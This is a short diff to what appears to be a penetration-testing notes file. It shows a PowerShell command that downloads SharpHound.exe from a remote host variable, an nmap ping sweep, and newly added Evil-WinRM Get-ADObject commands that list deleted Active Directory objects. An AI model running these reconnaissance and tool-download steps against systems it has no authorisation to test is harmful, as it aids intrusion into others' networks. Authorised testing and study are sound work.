@@ -12,3 +12,9 @@ iwr $ip/SharpHound.exe -o SharpHound.exe
 ```bash
 nmap $ip_range -sn  | grep for | cut -d" " -f5
 ```
+
+Evil-Winrm
+```bash
+Get-ADObject -Filter 'objectsid -eq "SID" -IncludeDeletedObjects'
+Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
+```
